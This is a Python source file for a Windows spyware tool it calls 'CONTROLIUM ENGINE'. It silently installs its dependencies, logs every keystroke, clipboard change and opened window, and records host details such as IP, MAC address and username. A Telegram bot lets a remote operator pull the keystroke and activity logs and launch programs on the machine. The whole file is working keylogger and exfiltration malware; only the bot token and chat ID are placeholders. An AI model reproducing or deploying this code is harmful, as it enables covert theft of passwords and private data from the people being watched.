import os
import time
import uuid
import logging
import socket
import datetime
import subprocess
import threading
import importlib

packages = ["psutil", "pyperclip", "telebot", "requests", "winshell", "webbrowser", "pyttsx3", "pygetwindow", "pynput", "plyer"]

for pkg in packages:
    if importlib.util.find_spec(pkg) is None:
        subprocess.check_call(["pip", "install", pkg])
    else:
        pass

import psutil
import pyperclip
import telebot
import requests
import winshell
import webbrowser
import pyttsx3
import pygetwindow as gw
from pynput import keyboard
from plyer import notification


def telegram_alert(send):
    bot_token = "BOT TOKEN"
    my_chatID = "CHAT ID"
    send_text = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + my_chatID + "&parse_mode=Markdown&text=" + send

    response = requests.get(send_text)
    return response.json()


def win_notification(message):
    msg = message.text
    notification.notify(
        title="Windows Notification",
        message=msg,
        app_icon=None,
        timeout=5,)


bot = telebot.TeleBot("BOT TOKEN")
@bot.message_handler(func=lambda message: True)

def command_engine(message):
    try:
        if message.text.lower() == "start":
            pass
        
        elif message.text.lower() == "stop":
            bot.reply_to(message, "System terminated")
            subprocess.run(["taskkill", "/F", "/PID", str(pid)])

        elif message.text.lower() == "log":
            try:
                with open(save_log_file, 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "keylog":
            try:
                with open(key_log_file, 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "notepad":
            os.startfile("C:/Users/ashfa/AppData/Local/Microsoft/WindowsApps/notepad.exe")
            bot.reply_to(message, "Opened Notepad")

        elif message.text.lower() == "chrome":
            os.startfile("C:\Program Files\Google\Chrome\Application\chrome.exe")
            bot.reply_to(message, "Opened Chrome")

        elif message.text.lower() == "vscode":
            os.startfile("C:/Users/ashfa/AppData/Local/Programs/Microsoft VS Code/Code.exe")
            bot.reply_to(message, "Opened Visual Studio Code")

        elif message.text.lower() == "word":
            os.startfile("C:/Program Files/Microsoft Office/root\Office16/WINWORD.EXE")
            bot.reply_to(message, "Opened Microsoft Word")

        elif message.text.lower() == "excel":
            os.startfile("C:/Program Files/Microsoft Office/root/Office16/EXCEL.EXE")
            bot.reply_to(message, "Opened Microsoft Excel")

        elif message.text.lower() == "files":
            os.startfile("C:/Windows/explorer.exe")
            bot.reply_to(message, "Opened File Explorer")

        elif message.text.lower() == "task manager":
            os.startfile("C:\WINDOWS\system32\Taskmgr.exe")
            bot.reply_to(message, "Opened Task Manager")

        elif message.text.lower() == "database":
            os.startfile("C:/Program Files/Microsoft Office/root/Office16/MSACCESS.EXE")
            bot.reply_to(message, "Opened Microsoft Access")

        else:
            bot.reply_to(message, "Invalid Command")
    except:
        bot.reply_to(message, "Error")

###############################################################################################

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
username = os.getlogin()
cpu_usage = psutil.cpu_percent(interval=1)
ram = psutil.virtual_memory()
ram_used = ram.used / (1024**3)
ram_available = ram.available / (1024**3)
boot_time = psutil.boot_time()
uptime = datetime.datetime.fromtimestamp(boot_time)
pid = os.getpid()


folder1 = os.path.exists("Activity Logs")
if folder1 == False:
    os.mkdir("Activity Logs")
folder2 = os.path.exists("Keystroke Logs")
if folder2 == False:
    os.mkdir("Keystroke Logs")


date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-Log.txt"
folder = "Activity Logs"
save_log_file = os.path.join(folder, log_file)

logging.basicConfig(filename=save_log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
logged_windows = set()


def log_windows():
    try:
        global logged_windows
        open_windows = gw.getWindowsWithTitle("")
        for window in open_windows:
            if window.title not in logged_windows:
                logging.info(f"Opened {window.title}")
                logged_windows.add(window.title)

                if window.title == "This PC":
                    logging.info("Opened File Explorer")
                elif window.title == "D:/":
                    logging.info("Opened Local Disk")
                elif window.title == "E:/":
                    logging.info("Opened Local Disk")

        for title in logged_windows.copy():
            if title not in gw.getAllTitles():
                logging.info(f"Closed {title}")
                logged_windows.remove(title)
    except:
        pass


date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-key-log.txt"
folder = "Keystroke Logs"
key_log_file = os.path.join(folder, log_file)


def key_press(key):
    try:
        with open(key_log_file, "a") as f:
            f.write(f"Key pressed: {key.char}\n")
    except AttributeError:
        with open(key_log_file, "a") as f:
            f.write(f"Key pressed: {key}\n")
    if key == keyboard.Key.print_screen:
        logging.info("Screenshot taken")

def key_release(key):
    if key == keyboard.Key.esc:
        return False
    

def log_keystrokes():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    with open(key_log_file, "a") as f:
        f.write(f'''CONTROLIUM ENGINE v1.2.0
{str(time_stamp)}
<< KEYSTROKE LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}
> Process ID: {pid}

''')
    with keyboard.Listener(on_press=key_press, on_release=key_release) as watcher:
        watcher.join()


def log_activity():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    logging.info(f'''CONTROLIUM ENGINE v1.2.0
{str(time_stamp)}
<< ACTIVITY LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}
> Process ID: {pid}
''')
    while True:
        log_windows()


def network_connection():
    result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    output = result.stdout
    ssid_line = [line for line in output.splitlines() if "SSID" in line]

    if ssid_line:
        ssid = ssid_line[0].split(":")[1].strip()
        logging.info(f"Connected to network: {ssid}")
    else:
        logging.info("Not connected to a network")


def clipboard_activity():
    before_clipboard = pyperclip.paste()

    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard != before_clipboard:
            logging.info(f"Clipboard changes: {current_clipboard}")
            before_clipboard = current_clipboard


def time_info():
    time = datetime.datetime.now().strftime("%H:%M")
    speech_engine(f"The time is {time} AM")

##########################################################################################

def telegram_bot():
    while True:
        try:
            telegram_alert(f"System online - {username}")
            bot.polling()
        except:
            time.sleep(5)


if __name__ == "__main__":
    keystroke_thread = threading.Thread(target=log_keystrokes)
    activity_thread = threading.Thread(target=log_activity)
    network_thread = threading.Thread(target=network_connection)
    clipboard_thread = threading.Thread(target=clipboard_activity)
    telegram_bot_thread = threading.Thread(target=telegram_bot)

    keystroke_thread.start()
    activity_thread.start()
    network_thread.start()
    clipboard_thread.start()
    telegram_bot_thread.start()

    keystroke_thread.join()
    activity_thread.join()
    network_thread.join()
    clipboard_thread.join()
    telegram_bot_thread.join()
